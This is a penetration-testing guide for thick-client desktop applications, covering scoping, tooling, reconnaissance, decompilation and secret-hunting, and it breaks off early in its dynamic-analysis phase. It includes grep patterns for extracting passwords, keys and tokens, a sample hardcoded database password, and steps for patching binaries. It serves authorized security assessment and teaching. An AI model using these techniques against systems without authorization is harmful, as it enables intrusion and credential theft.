# 🖥️ Thick Client Application Penetration Testing — Complete End-to-End Guide

> **Version:** 2025 Edition | **Standard Alignment:** OWASP TASVS v1.6, OWASP Desktop App Top 10, PTES, NIST SP 800-115, MITRE ATT&CK  
> **Audience:** Penetration Testers, Security Engineers, AppSec Professionals, Red Team Operators  
> **Legal Notice:** This guide is for **authorized security assessments only**. Always obtain written permission before testing any application. Unauthorized testing is illegal under the Computer Fraud and Abuse Act (CFAA), UK Computer Misuse Act, IT Act 2000 (India), and equivalent laws worldwide.

---

## 📚 Table of Contents

1. [What is a Thick Client Application?](#1-what-is-a-thick-client-application)
2. [Thick Client vs Thin Client vs Web App](#2-thick-client-vs-thin-client-vs-web-app)
3. [Architecture Deep Dive](#3-architecture-deep-dive)
4. [Attack Surface Overview](#4-attack-surface-overview)
5. [Engagement Setup & Scoping](#5-engagement-setup--scoping)
6. [Regulatory & Compliance Context](#6-regulatory--compliance-context)
7. [Complete Toolset Arsenal (2025)](#7-complete-toolset-arsenal-2025)
8. [Phase 1 — Information Gathering & Reconnaissance](#8-phase-1--information-gathering--reconnaissance)
9. [Phase 2 — Static Analysis (SAST)](#9-phase-2--static-analysis-sast)
10. [Phase 3 — Dynamic Analysis (DAST)](#10-phase-3--dynamic-analysis-dast)
11. [Phase 4 — Network Traffic Analysis & Interception](#11-phase-4--network-traffic-analysis--interception)
12. [Phase 5 — Local Storage & Data Security Testing](#12-phase-5--local-storage--data-security-testing)
13. [Phase 6 — Authentication & Authorization Testing](#13-phase-6--authentication--authorization-testing)
14. [Phase 7 — Injection Attack Testing](#14-phase-7--injection-attack-testing)
15. [Phase 8 — Binary Protections & Reverse Engineering](#15-phase-8--binary-protections--reverse-engineering)
16. [Phase 9 — Memory Analysis & Runtime Manipulation](#16-phase-9--memory-analysis--runtime-manipulation)
17. [Phase 10 — Inter-Process Communication (IPC) Testing](#17-phase-10--inter-process-communication-ipc-testing)
18. [Phase 11 — DLL Hijacking & EXE Hijacking](#18-phase-11--dll-hijacking--exe-hijacking)
19. [Phase 12 — Privilege Escalation](#19-phase-12--privilege-escalation)
20. [Phase 13 — Cryptography & Secrets Testing](#20-phase-13--cryptography--secrets-testing)
21. [Phase 14 — Business Logic Testing](#21-phase-14--business-logic-testing)
22. [Phase 15 — UI-Level Bypass & Window Manipulation](#22-phase-15--ui-level-bypass--window-manipulation)
23. [Phase 16 — Updater & Installer Security](#23-phase-16--updater--installer-security)
24. [Phase 17 — Logging, Monitoring & Error Handling](#24-phase-17--logging-monitoring--error-handling)
25. [Phase 18 — Anti-Tampering & Anti-Debugging Controls](#25-phase-18--anti-tampering--anti-debugging-controls)
26. [OWASP Desktop App Top 10 — Complete Mapping](#26-owasp-desktop-app-top-10--complete-mapping)
27. [OWASP TASVS Control Groups](#27-owasp-tasvs-control-groups)
28. [Complete Test Case Checklist](#28-complete-test-case-checklist)
29. [Lab Setup Guide](#29-lab-setup-guide)
30. [Sample Vulnerability Findings & CVSS Scoring](#30-sample-vulnerability-findings--cvss-scoring)
31. [Reporting Template Structure](#31-reporting-template-structure)
32. [Trusted References, GitHub Repos & Resources](#32-trusted-references-github-repos--resources)

---

## 1. What is a Thick Client Application?

A **thick client** (also called a *fat client*, *rich client*, or *desktop application*) is a type of software that runs locally on a user's machine and performs a significant portion of its data processing, business logic, and presentation locally — rather than delegating all computation to a remote server.

### Core Characteristics

| Characteristic | Description |
|---|---|
| **Local Processing** | Significant business logic executes on the client machine |
| **Local Storage** | Data is frequently stored on disk, in registries, or local databases |
| **Direct OS Access** | Deep integration with OS APIs, file system, and system resources |
| **Multiple Protocols** | Communicates via HTTP/S, TCP, UDP, named pipes, COM, RPC, and custom binary protocols |
| **Compiled Binary** | Typically distributed as compiled executables (.exe, .jar, .app) |
| **Offline Capability** | Many thick clients can function without continuous server connectivity |

### Common Thick Client Categories in the Wild

- **Banking & Financial Trading Platforms** — Bloomberg Terminal, MetaTrader, core banking software
- **Healthcare & Medical Systems** — EMR software, PACS (medical imaging), pharmacy systems
- **ERP & CRM Clients** — SAP GUI, Oracle Forms, Siebel CRM, legacy ERP frontends
- **Industrial & SCADA** — HMI (Human-Machine Interface) software, SCADA frontends
- **Remote Desktop Clients** — Citrix Workspace, VMware Horizon, RDP clients
- **Development Tools** — IDEs, database clients (DBeaver, SSMS, Toad)
- **Communication Apps** — Thick versions of Slack, Teams, Zoom (Electron-based)
- **Gaming Clients** — Steam, Epic Games Launcher, game executables
- **VPN & Security Software** — VPN clients, endpoint protection management consoles
- **Legal & Compliance Tools** — e-discovery software, document management systems

---

## 2. Thick Client vs Thin Client vs Web App

Understanding the distinction is critical to understanding why the attack surface is fundamentally different.

```
┌─────────────────────────────────────────────────────────────────────────┐
│                         CLIENT ARCHITECTURE SPECTRUM                     │
├─────────────────┬─────────────────────┬────────────────────────────────┤
│   THIN CLIENT   │    WEB APPLICATION  │        THICK CLIENT            │
├─────────────────┼─────────────────────┼────────────────────────────────┤
│ Browser/terminal│ Browser             │ Compiled executable            │
│ All logic on    │ Logic split between │ Logic runs locally             │
│ server          │ browser + server    │ or split client/server         │
├─────────────────┼─────────────────────┼────────────────────────────────┤
│ No local data   │ Cookies, localStorage│ Registry, files, local DB     │
├─────────────────┼─────────────────────┼────────────────────────────────┤
│ HTTP only       │ HTTP/WebSocket      │ HTTP, TCP, UDP, named pipes,   │
│                 │                     │ COM, RPC, custom protocols     │
├─────────────────┼─────────────────────┼────────────────────────────────┤
│ WAF protection  │ WAF, CDN protection │ NO WAF — direct attack         │
├─────────────────┼─────────────────────┼────────────────────────────────┤
│ Easy to test    │ Well-documented     │ Requires specialized tooling   │
│                 │ testing methods     │ and methodology                │
└─────────────────┴─────────────────────┴────────────────────────────────┘
```

### Why Thick Clients Are Harder to Secure

1. **No network perimeter protection** — attackers have the binary on their own machine
2. **Direct debugger access** — any process can be attached to with sufficient privileges
3. **Memory is accessible** — secrets in RAM can be dumped and searched
4. **Binary reversibility** — compiled code can be decompiled and analyzed offline
5. **Local file system access** — config files, SQLite databases, log files are readable
6. **Proprietary protocols** — custom wire formats not covered by standard WAF rules

---

## 3. Architecture Deep Dive

### 3.1 Two-Tier Architecture

```
┌────────────────────────────────────────────────────────┐
│                    CLIENT MACHINE                       │
│  ┌───────────────────────────────────────────────────┐ │
│  │              THICK CLIENT APPLICATION             │ │
│  │  ┌──────────────┐  ┌──────────────┐              │ │
│  │  │  UI Layer    │  │ Business     │              │ │
│  │  │  (Presentation│  │ Logic Layer  │              │ │
│  │  │   & Controls)│  │ (Validation, │              │ │
│  │  └──────────────┘  │  Auth Logic) │              │ │
│  │                    └──────────────┘              │ │
│  └───────────────────────────────────────────────────┘ │
│                         │ Direct DB Connection           │
└─────────────────────────┼──────────────────────────────┘
                          │ SQL Protocol (TDS, MySQL, OCI)
                          ▼
              ┌───────────────────────┐
              │      DATABASE         │
              │   (SQL Server, MySQL, │
              │    Oracle, etc.)      │
              └───────────────────────┘
```

**Security Implications of Two-Tier:**
- Database credentials must be stored somewhere accessible to the client
- Business logic is entirely client-side and can be reversed and bypassed
- Direct database connections are often discoverable via traffic sniffing
- The database port is exposed to the client network segment

### 3.2 Three-Tier Architecture

```
┌───────────────────────────┐
│      CLIENT MACHINE        │
│  ┌────────────────────┐   │
│  │  THICK CLIENT APP  │   │
│  │  UI + Thin Logic   │   │
│  └────────────────────┘   │
└─────────────┬─────────────┘
              │ HTTP/S, TCP, gRPC, SOAP, REST
              ▼
┌───────────────────────────┐
│    APPLICATION SERVER      │
│  Business Logic, Auth,    │
│  Session Management        │
└─────────────┬─────────────┘
              │ Database Protocol
              ▼
┌───────────────────────────┐
│       DATABASE SERVER      │
└───────────────────────────┘
```

**Security Implications of Three-Tier:**
- More secure by design, but client-server communication is still attackable
- Token/session handling errors are common
- The application server may still trust client-supplied data without server-side validation
- Client-side business logic checks can still be bypassed

---

## 4. Attack Surface Overview

The attack surface of a thick client is dramatically larger than a web app because attackers operate **inside** the trust boundary.

```
                    ┌─────────────────────────────────────────┐
                    │          THICK CLIENT ATTACK SURFACE      │
                    │                                           │
   ┌────────────────┼──────────────┐    ┌────────────────────┐ │
   │  LOCAL ATTACK SURFACE         │    │ NETWORK ATTACK      │ │
   │                               │    │ SURFACE             │ │
   │ • Compiled binary reversal    │    │                     │ │
   │ • Memory scraping/dumping     │    │ • Cleartext traffic │ │
   │ • Local file/registry access  │    │ • Weak TLS/SSL      │ │
   │ • Config file secrets         │    │ • Token replay      │ │
   │ • SQLite / local DB           │    │ • Custom protocol   │ │
   │ • DLL hijacking               │    │   manipulation      │ │
   │ • Debugger attachment         │    │ • MITM attacks      │ │
   │ • UI manipulation             │    │ • SQL injection via │ │
   │ • Privilege escalation        │    │   wire traffic      │ │
   │ • Installer manipulation      │    │ • Replay attacks    │ │
   │ • IPC abuse                   │    │                     │ │
   └───────────────────────────────┘    └────────────────────┘ │
                    │                                           │
                    └─────────────────────────────────────────┘
```

---

## 5. Engagement Setup & Scoping

### 5.1 Pre-Engagement Checklist

Before any testing begins, the following must be completed:

```
☐ Signed Rules of Engagement (RoE) document
☐ Written authorization letter from application owner
☐ Defined scope — which versions, which environments (staging/prod)
☐ Out-of-scope boundaries documented (e.g., no production DB)
☐ Emergency contact list (developer, CISO, SOC)
☐ Testing window defined (business hours vs. off-hours)
☐ Data handling agreement (for sensitive data encountered)
☐ NDA signed if proprietary IP is involved
☐ Test machine specification approved (OS version, domain-joined or not)
☐ Access credentials provided (normal user + admin user + backend credentials if in scope)
```

### 5.2 Scoping Questions to Ask the Client

These questions help you understand what to test and how deep to go:

**Application Architecture:**
- What technologies are used? (.NET, Java, C++, Electron, Delphi, PowerBuilder?)
- Is this a two-tier or three-tier application?
- What backend protocols are used? (REST, SOAP, gRPC, custom TCP/UDP?)
- Does the app communicate directly with a database?
- What database is used? (SQL Server, Oracle, MySQL, SQLite?)

**Authentication & Authorization:**
- How does the app authenticate users? (Active Directory, OAuth, custom?)
- Are there multiple privilege levels? (User, admin, superadmin, service accounts?)
- How are sessions managed?

**Deployment & Environment:**
- What OS platform? (Windows, Linux, macOS, or cross-platform?)
- Is the app installed by MSI/NSIS/pkg or just portable?
- Is there an auto-updater?
- Is code signing in place?
- Does the app run with elevated privileges?

**Data Sensitivity:**
- What types of sensitive data does the app process? (PII, PHI, financial, IP?)
- Is there local data storage? What formats?

### 5.3 Test Environment Setup

Always test in an **isolated lab environment** that mirrors production:

```
┌─────────────────────────────────────────────────────────┐
│                    TEST LAB TOPOLOGY                      │
│                                                           │
│  ┌───────────────┐      ┌────────────────────────────┐  │
│  │   ATTACKER    │      │   TEST THICK CLIENT VM      │  │
│  │   MACHINE     │─────▶│                             │  │
│  │  (Kali Linux/ │      │  • Windows 10/11 x64        │  │
│  │   Windows)    │      │  • Application installed    │  │
│  │               │      │  • Wireshark, Procmon       │  │
│  └───────────────┘      │  • Burp Suite CA installed  │  │
│                         └─────────────┬───────────────┘  │
│                                       │                   │
│                         ┌─────────────▼───────────────┐  │
│                         │      TEST SERVER VM           │  │
│                         │  • App backend/database       │  │
│                         │  • Separate from prod         │  │
│                         └─────────────────────────────┘  │
└─────────────────────────────────────────────────────────┘
```

**VM Requirements:**
- Snapshots BEFORE testing (to restore clean state for reproducibility)
- Network capture capability (Wireshark on host or span port)
- Disable Windows Defender selectively for testing tools (document this)
- Multiple user accounts with different privilege levels

---

## 6. Regulatory & Compliance Context

Thick client security testing is often mandated by:

| Framework / Standard | Relevance to Thick Clients |
|---|---|
| **PCI DSS v4.0** | Requirement 6.3 — All custom software must be reviewed for security vulnerabilities |
| **HIPAA** | Security Rule — PHI in desktop apps requires encryption at rest and in transit |
| **SOC 2 Type II** | CC6.1 — Logical access controls must be tested |
| **ISO 27001:2022** | A.8.25 — Secure development lifecycle requirements |
| **NIST SP 800-115** | Technical guide to information security testing |
| **OWASP TASVS v1.6** | Specific thick client security verification standard (released Sep 2024) |
| **DORA (EU)** | Digital Operational Resilience Act — requires application security testing |
| **GDPR** | Article 25 — Data protection by design applies to desktop apps handling EU PII |

---

## 7. Complete Toolset Arsenal (2025)

This is the authoritative, categorized tool list for thick client penetration testing as of 2025. All tools listed are open-source or legitimate commercial tools from trusted sources.

### 7.1 Proxy & Traffic Interception Tools

| Tool | Platform | Purpose | Download |
|---|---|---|---|
| **Burp Suite Pro/Community** | Cross-platform | HTTP/S interception, modification, and scanning | https://portswigger.net/burp |
| **Echo Mirage** | Windows | Intercepts non-HTTP TCP traffic by hooking into the application process | https://sourceforge.net/projects/echomirage.oldbutgold.p/ |
| **Fiddler Classic** | Windows | HTTP/S proxy, great for .NET apps (auto-configures system proxy) | https://www.telerik.com/fiddler |
| **MITM_Relay** | Cross-platform | Wraps non-HTTP protocols in HTTP for Burp inspection | https://github.com/jrmdev/mitm_relay |
| **Mallory** | Cross-platform | Transparent TCP/UDP proxy for non-HTTP protocols | https://github.com/intrepidusgroup/mallory |
| **Proxifier** | Windows/macOS | Force any application through a proxy (system-wide) | https://www.proxifier.com/ |
| **ProxyCap** | Windows/macOS | Route specific processes through Burp Suite | https://www.proxycap.com/ |
| **mitmproxy** | Cross-platform | Python-scriptable HTTPS proxy | https://mitmproxy.org/ |
| **Charles Proxy** | Cross-platform | HTTP/S + WebSocket proxy with SSL inspection | https://www.charlesproxy.com/ |

### 7.2 Process, File System & Registry Monitoring (Sysinternals Suite)

| Tool | Purpose | Download |
|---|---|---|
| **Process Monitor (Procmon)** | Real-time file system, registry, and process activity | https://learn.microsoft.com/sysinternals/downloads/procmon |
| **Process Explorer** | Advanced task manager — shows DLLs, handles, network connections per process | https://learn.microsoft.com/sysinternals/downloads/process-explorer |
| **Autoruns** | Shows all auto-start programs, scheduled tasks, drivers, browser extensions | https://learn.microsoft.com/sysinternals/downloads/autoruns |
| **TCPView** | Real-time view of all TCP/UDP connections (maps to process) | https://learn.microsoft.com/sysinternals/downloads/tcpview |
| **Strings / strings64** | Extract human-readable strings from binaries | https://learn.microsoft.com/sysinternals/downloads/strings |
| **Sigcheck** | Verify binary signatures, check VirusTotal | https://learn.microsoft.com/sysinternals/downloads/sigcheck |
| **AccessChk** | Check effective permissions on files, directories, services, registry | https://learn.microsoft.com/sysinternals/downloads/accesschk |
| **PipeList** | List named pipes exposed by the system | https://learn.microsoft.com/sysinternals/downloads/pipelist |
| **Regshot** | Registry snapshot comparison (before/after install or action) | https://github.com/Seabreg/Regshot |

### 7.3 Debuggers & Binary Analysis

| Tool | Platform | Purpose | Download |
|---|---|---|---|
| **x64dbg** | Windows | Open-source x64/x32 debugger — industry standard for Windows PE debugging | https://x64dbg.com |
| **WinDbg / WinDbg Preview** | Windows | Microsoft's kernel and user-mode debugger | https://learn.microsoft.com/windows-hardware/drivers/debugger/ |
| **OllyDbg** | Windows | Classic 32-bit assembler-level Windows debugger | http://www.ollydbg.de/ |
| **GDB** | Linux/macOS | GNU Debugger for Linux/macOS thick clients | https://www.gnu.org/software/gdb/ |
| **LLDB** | macOS/Linux | Apple's debugger, default on macOS | https://lldb.llvm.org/ |
| **Frida** | Cross-platform | Dynamic instrumentation toolkit — hook functions, modify behavior at runtime | https://frida.re |
| **Cheat Engine** | Windows | Memory scanner and editor — find and modify in-memory values | https://www.cheatengine.org/ |

### 7.4 Decompilers & Reverse Engineering

| Tool | Language Support | Purpose | Download |
|---|---|---|---|
| **dnSpy** | .NET (C#, VB.NET) | Decompile, edit, and debug .NET assemblies without source code | https://github.com/dnSpyEx/dnSpy |
| **de4dot** | .NET | .NET deobfuscator and unpacker | https://github.com/de4dot/de4dot |
| **ILSpy** | .NET | Open-source .NET assembly browser and decompiler | https://github.com/icsharpcode/ILSpy |
| **JetBrains dotPeek** | .NET | Free .NET decompiler | https://www.jetbrains.com/decompiler/ |
| **Ghidra** | Native (x86, ARM, MIPS, etc.) | NSA's open-source reverse engineering framework | https://ghidra-sre.org |
| **IDA Pro / IDA Free** | Native binaries | Industry-leading disassembler/decompiler | https://hex-rays.com/ida-pro/ |
| **Radare2 / Cutter** | Multi-architecture | Open-source reverse engineering framework + GUI | https://rada.re |
| **JD-GUI** | Java | Java decompiler GUI | https://github.com/java-decompiler/jd-gui |
| **JADX / JADX-GUI** | Java/Android | DEX to Java decompiler | https://github.com/skylot/jadx |
| **Bytecode Viewer** | Java | Lightweight Java bytecode viewer with multiple decompilers | https://github.com/Konloch/bytecode-viewer |
| **PE Explorer** | Windows PE | View, edit, and reverse Windows EXE/DLL | http://www.heaventools.com/overview.htm |
| **CFF Explorer** | Windows PE | PE header editor and structure viewer | https://ntcore.com/?page_id=388 |
| **Detect-It-Easy (DIE)** | Cross-platform | Identify file type, packer, compiler, and protections | https://github.com/horsicq/Detect-It-Easy |
| **PEiD** | Windows PE | Identify packed/encrypted PE files and packer type | https://github.com/wolfram77web/app-peid |

### 7.5 Network Analysis & Packet Capture

| Tool | Purpose | Download |
|---|---|---|
| **Wireshark** | Full packet capture and protocol dissection | https://www.wireshark.org |
| **tcpdump** | CLI packet capture (Linux/macOS) | Built-in on Linux/macOS |
| **NetworkMiner** | Passive network sniffer and forensic analyzer | https://www.netresec.com/?page=NetworkMiner |
| **Nmap** | Port scanning and service fingerprinting of server-side | https://nmap.org |
| **ncat / netcat** | TCP/UDP connection testing | https://nmap.org/ncat/ |

### 7.6 Memory Analysis

| Tool | Purpose | Download |
|---|---|---|
| **Volatility 3** | Memory forensics framework | https://github.com/volatilityfoundation/volatility3 |
| **HxD** | Hex editor — manual memory dump analysis | https://mh-nexus.de/en/hxd/ |
| **WinHex** | Hex and disk editor | https://www.x-ways.net/winhex/ |
| **Process Hacker** | Advanced task manager with memory inspection | https://processhacker.sourceforge.io/ |
| **API Monitor** | Monitor and control API calls made by an application | http://www.rohitab.com/apimonitor |

### 7.7 Window & UI Manipulation

| Tool | Purpose | Download |
|---|---|---|
| **WinSpy++** | View and modify properties of any window, controls, messages | https://github.com/strobejb/winspy |
| **WinManipulate** | Manipulate window objects — enable/disable/show hidden controls | https://github.com/appsecco/WinManipulate |
| **Spy++** | Microsoft Visual Studio built-in window spy tool | Included in Visual Studio |
| **Accessibility Insights** | Inspect UI Automation tree — discover hidden elements | https://accessibilityinsights.io |

### 7.8 Specialized Thick Client Testing Tools

| Tool | Purpose | Download |
|---|---|---|
| **BinScope Binary Analyzer** | Checks for security compile flags (ASLR, DEP, SafeSEH, etc.) | https://www.microsoft.com/en-us/download/details.aspx?id=44995 |
| **winchecksec** | Check Windows binary security features | https://github.com/trailofbits/winchecksec |
| **checksec** | Check Linux/macOS binary protections (NX, PIE, RELRO, stack canary) | https://github.com/slimm609/checksec.sh |
| **SQLite Browser (DB Browser)** | Open and query SQLite database files | https://sqlitebrowser.org/ |
| **Visual Code Grepper (VCG)** | Static code analysis with pattern matching for secrets | https://github.com/nccgroup/VCG |
| **Semgrep** | SAST — pattern-based static analysis for decompiled code | https://semgrep.dev |
| **grep / ripgrep (rg)** | String searching in decompiled source | https://github.com/BurntSushi/ripgrep |

### 7.9 Exploitation & Post-Exploitation

| Tool | Purpose | Download |
|---|---|---|
| **Metasploit Framework** | Exploitation framework | https://github.com/rapid7/metasploit-framework |
| **Impacket** | Python classes for network protocol exploitation | https://github.com/fortra/impacket |
| **Responder** | LLMNR/NBT-NS/mDNS poisoning | https://github.com/lgandx/Responder |

### 7.10 Fuzzing Tools

| Tool | Purpose | Download |
|---|---|---|
| **Peach Fuzzer** | Protocol and file format fuzzing | https://peachtech.gitlab.io/peach-fuzzer-community/ |
| **boofuzz** | Python-based network fuzzing framework | https://github.com/jtpereyda/boofuzz |
| **AFL++ (AFL++)** | Coverage-guided fuzzing for binary applications | https://github.com/AFLplusplus/AFLplusplus |
| **WinAFL** | Windows port of AFL for thick client fuzzing | https://github.com/googleprojectzero/winafl |

---

## 8. Phase 1 — Information Gathering & Reconnaissance

This is the most important phase. The quality of your entire test depends on how well you understand the application before you start poking it.

### 8.1 Passive Reconnaissance (Before Installation)

**Test Case TC-RECON-001: Application Metadata Discovery**

Gather as much intelligence as possible before running the application.

```
Steps:
1. Google the application name + version
2. Check the vendor's website, release notes, and changelogs
3. Search CVE databases:
   - https://nvd.nist.gov/vuln/search
   - https://www.cvedetails.com/
   - https://www.exploit-db.com/
4. Check if the vendor has a bug bounty program:
   - https://hackerone.com/
   - https://bugcrowd.com/
5. Search GitHub for source code leaks or related repositories
6. Check Shodan for exposed backend services
7. Review any available API documentation or SDK
```

**Test Case TC-RECON-002: Installer Analysis**

Before running the installer, analyze it statically:

```powershell
# Check file type and metadata
file setup.exe
exiftool setup.exe

# Check digital signature
Get-AuthenticodeSignature .\setup.exe
sigcheck.exe setup.exe

# Extract strings from installer
strings64.exe setup.exe | findstr -i "password\|secret\|key\|token\|url\|http\|ftp"

# For MSI files:
msiexec /a setup.msi /qb TARGETDIR=C:\Extracted
# Then explore C:\Extracted

# For NSIS installers: use 7-Zip or UniExtract
7z x setup.exe -oC:\Extracted

# For Inno Setup installers: use innounp
innounp.exe -x setup.exe -d C:\Extracted
```

**Look for:**
- Hardcoded credentials in installer scripts
- URLs to update servers (to test update mechanisms)
- Embedded configuration files
- Bundled certificates or private keys

### 8.2 Active Reconnaissance (During & After Installation)

**Test Case TC-RECON-003: Registry Activity Capture**

Use Regshot to compare registry state before and after installation:

```
1. Open Regshot → Click "1st shot" → Scan
2. Install the application
3. Click "2nd shot" → Scan
4. Click "Compare" to see all registry changes
5. Export results to HTML/text

Look for:
- Stored credentials (HKCU\Software\<AppName>\password)
- API keys or tokens stored in registry
- Connection strings
- Auto-run keys (HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run)
- COM object registration
```

**Test Case TC-RECON-004: File System Activity Capture**

```
1. Open Process Monitor (Procmon)
2. Set filter: Process Name is <appname>.exe
3. Enable: Show File System Activity
4. Enable: Show Registry Activity
5. Launch the application and perform initial login
6. Export results to CSV for analysis

Key locations to review:
- %APPDATA%\<AppName>\
- %LOCALAPPDATA%\<AppName>\
- %ProgramData%\<AppName>\
- %TEMP%\
- C:\Program Files\<AppName>\
- %USERPROFILE%\Documents\<AppName>\
```

**Test Case TC-RECON-005: Technology Fingerprinting**

```
1. Open the executable in CFF Explorer
   - Check: Architecture (x86/x64/ARM)
   - Check: Import table (which DLLs does it use?)
   - Check: Resources (icons, manifests, version info)

2. Open in Detect-It-Easy (DIE):
   - Compiler/linker identification
   - Packer detection
   - .NET vs native vs Java

3. Check the manifest:
   - requestedExecutionLevel (requireAdministrator / asInvoker)
   - UAC settings

4. Check file version info:
   Right-click EXE → Properties → Details
   Note: Product name, company, version, file description

5. For .NET apps:
   ildasm.exe <app>.exe /out:output.il
   (Check .NET version, namespaces, class structure)

6. Check linked libraries:
   dumpbin /dependents <app>.exe
   # or
   Dependencies.exe (free tool)
```

**Test Case TC-RECON-006: Network Port Discovery**

```
# Before launching app:
netstat -ano | findstr LISTENING > before.txt

# Launch application, perform key operations

# After:
netstat -ano | findstr LISTENING > after.txt

# Compare:
fc before.txt after.txt

# Use TCPView for real-time visual monitoring
TCPView.exe

# Use Nmap to scan the backend server:
nmap -sV -sC -p- <backend-server-ip>
nmap -sU -p 53,67,68,123,161 <backend-server-ip>

# Use Wireshark with display filter:
# Filter by the app's process (use pid from Process Explorer):
# frame matches "<app-hostname>"
```

---

## 9. Phase 2 — Static Analysis (SAST)

Static analysis is performed **without running the application**. You analyze the binary, its code, and its artifacts to find vulnerabilities, secrets, and logic flaws.

### 9.1 .NET Application Decompilation

**Test Case TC-STATIC-001: .NET Assembly Decompilation with dnSpy**

```
Steps:
1. Download dnSpy: https://github.com/dnSpyEx/dnSpy/releases
2. File → Open → Select <AppName>.exe and all DLLs in the app directory
3. Navigate the namespace tree to understand application structure
4. Look for:
   a. Connection strings in app.config or hardcoded in code
   b. Hardcoded credentials (grep for: "password", "Password", "secret", "apikey")
   c. Cryptographic implementations (look for custom crypto — red flag)
   d. Authentication logic
   e. Authorization checks (look for: "IsAdmin", "HasPermission", "role == ")

Useful dnSpy features:
- Ctrl+F to search entire assembly
- Right-click method → "Analyze" to find all callers/callees
- Edit method bodies directly (for patching)
- Debug: Start → select process to debug with full .NET source

Example search patterns in dnSpy (use Edit → Find):
- "password" (case-insensitive)
- "connectionString"
- "SELECT * FROM"
- "http://" (non-HTTPS connections)
- "MD5" or "SHA1" (weak hashing)
- "Convert.ToBase64String" (look for credential encoding)
```

**Test Case TC-STATIC-002: de4dot — .NET Deobfuscation**

Many production .NET thick clients use obfuscators (ConfuserEx, Dotfuscator, SmartAssembly). Before decompiling, run de4dot:

```powershell
# Download: https://github.com/de4dot/de4dot
# Detect obfuscator:
de4dot.exe <app>.exe

# Deobfuscate:
de4dot.exe -r C:\AppFolder\ -ro C:\DeobfuscatedOutput\

# Then open the deobfuscated binary in dnSpy
# Note: de4dot auto-detects most obfuscators
```

### 9.2 Java Application Decompilation

**Test Case TC-STATIC-003: Java JAR Decompilation**

```bash
# Method 1: JD-GUI (graphical)
# Download: https://github.com/java-decompiler/jd-gui
java -jar jd-gui-1.6.6.jar
# File → Open → <app>.jar

# Method 2: JADX
jadx-gui <app>.jar
# or
jadx -d output_dir <app>.jar

# Method 3: Fernflower (IntelliJ's decompiler)
java -jar fernflower.jar <app>.jar output/

# Searching for secrets:
grep -r "password\|secret\|apikey\|jdbc:" output/ --include="*.java"
grep -r "http://" output/ --include="*.java"   # Unencrypted URLs
grep -r "DES\|MD5\|SHA1" output/ --include="*.java"  # Weak crypto
```

### 9.3 Native Application Analysis

**Test Case TC-STATIC-004: Ghidra Reverse Engineering**

```
1. Download Ghidra: https://ghidra-sre.org
2. Create new project → Import binary
3. Auto-analysis (accept defaults)
4. Use the Symbol Table to find interesting functions:
   - Search: Functions → filter "password", "decrypt", "auth"
5. Use XREF to find all call sites of sensitive functions
6. Look for:
   - String references to credentials
   - Anti-debugging checks (calls to IsDebuggerPresent)
   - Crypto API calls (CryptEncrypt, CryptDecrypt, BCryptDecrypt)
   - Hard-coded IP addresses or API endpoints

# Export Ghidra decompiled output:
File → Export Program → C/C++ format
# Then grep the exported code
grep -i "password\|secret\|key" decompiled_output.c
```

**Test Case TC-STATIC-005: Binary String Extraction**

```powershell
# Sysinternals Strings:
strings64.exe -nobanner <app>.exe > strings_output.txt
findstr /i "password secret key token api http ftp jdbc" strings_output.txt

# GNU strings (WSL/Linux):
strings <app>.exe | grep -iE "password|secret|key|token|api|http|ftp|jdbc"

# Search for common credential patterns:
strings <app>.exe | grep -P "[a-zA-Z0-9+/]{20,}={0,2}"  # Base64
strings <app>.exe | grep -P "(?i)(password|passwd|pwd)\s*[=:]\s*\S+"
strings <app>.exe | grep -P "(?i)(api[_-]?key|token|secret)\s*[=:]\s*\S+"
```

### 9.4 Configuration File Analysis

**Test Case TC-STATIC-006: Configuration File Review**

```
Files to check (Windows):
- C:\Program Files\<App>\*.config
- C:\Program Files\<App>\*.xml
- C:\Program Files\<App>\*.json
- C:\Program Files\<App>\*.ini
- C:\Program Files\<App>\*.properties
- %APPDATA%\<App>\*.cfg

# Search for secrets:
findstr /i /s "password\|secret\|key\|token\|connectionstring" *.config *.xml *.json *.ini

# Check .NET App.config / Web.config:
# Look for connectionStrings section:
<connectionStrings>
  <add name="DefaultConnection" 
       connectionString="Server=192.168.1.10;Database=AppDB;
       User Id=sa;Password=P@ssw0rd123;" />
</connectionStrings>

# This is a critical finding: hardcoded DB credentials

# For Java:
cat application.properties
# or
cat hibernate.cfg.xml
```

### 9.5 Binary Security Feature Verification

**Test Case TC-STATIC-007: Binary Protection Checks**

```powershell
# On Windows — check with winchecksec:
winchecksec <app>.exe

# Or using Sysinternals sigcheck:
sigcheck -a <app>.exe

# What to check:
# ✓ ASLR (Address Space Layout Randomization): should be ON
# ✓ DEP/NX (Data Execution Prevention): should be ON
# ✓ SafeSEH: should be ON (32-bit only)
# ✓ CFG (Control Flow Guard): should be ON
# ✓ GS (Stack cookies): should be ON
# ✓ Authenticode signature: should be signed by vendor
# ✓ Strong name (for .NET): should be signed
# ✓ High entropy ASLR: should be ON

# On Linux — checksec:
checksec --file=<app_binary>

# Expected secure output:
# RELRO: Full RELRO
# Stack: Canary found
# NX: NX enabled
# PIE: PIE enabled
# RPATH: No RPATH
# RUNPATH: No RUNPATH
# Symbols: No Symbols
# FORTIFY: Fortified

# For .NET:
# Check: Is AnyCPU or x64? (AnyCPU preferred)
# Check: Strong name signing
# Check: .NET version (is it outdated?)
```

---

## 10. Phase 3 — Dynamic Analysis (DAST)

Dynamic analysis involves running the application and observing its behavior in real-time.

### 10.1 Runtime Behavior Monitoring

**Test Case TC-DYNAMIC-001: Process Monitoring During Application Lifecycle**

```
1. Open Procmon (Run as Administrator)
2. Set filters:
   - Process Name contains <appname>
   - Or: PID is <pid>
   
3. Include operations:
   - ReadFile, WriteFile (file access)
   - RegQueryValue, RegSetValue, RegDeleteValue (registry)
   - Process Create (child processes spawned)
   - Network Connect (network connections)

4. Trigger application actions:
   - Login
   - View sensitive records
   - Export functionality
   - Print functionality
   - Configuration changes

5. Export and analyze:
   - File → Save As → CSV for scripted analysis
   - Look for:
     * Writes to temp files (cleartext data?)
     * Registry writes (sensitive values?)
     * Child process creation (command injection opportunity?)
     * Network connections (unexpected destinations?)
```

**Test Case TC-DYNAMIC-002: API Monitoring with API Monitor**

```
1. Download API Monitor: http://www.rohitab.com/apimonitor
2. Launch API Monitor → File → Monitor New Process
3. Configure to monitor:
   - Cryptography APIs (CryptEncrypt, CryptDecrypt, BCryptDecrypt)
   - File APIs (CreateFile, WriteFile, ReadFile)
   - Registry APIs (RegSetValueEx, RegQueryValueEx)
   - Network APIs (WSASend, WSARecv, send, recv)
   - Authentication APIs (LogonUser, AcquireCredentialsHandle)

4. Start the application and trigger relevant functionality
